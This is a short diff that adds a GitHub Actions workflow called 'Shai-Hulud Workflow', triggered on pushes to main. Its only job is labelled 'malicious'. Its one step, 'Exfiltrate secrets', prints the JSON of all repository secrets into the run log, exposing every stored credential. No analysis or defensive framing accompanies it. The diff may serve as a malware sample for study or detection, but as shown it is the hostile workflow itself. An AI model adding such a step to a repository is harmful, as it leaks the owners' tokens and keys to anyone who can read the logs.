@@ -1,0 +1,12 @@
+name: Shai-Hulud Workflow
+on:
+  push:
+    branches: [ main ]
+jobs:
+  malicious:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exfiltrate secrets
+        run: |
+          echo ${{ toJSON(secrets) }}
+
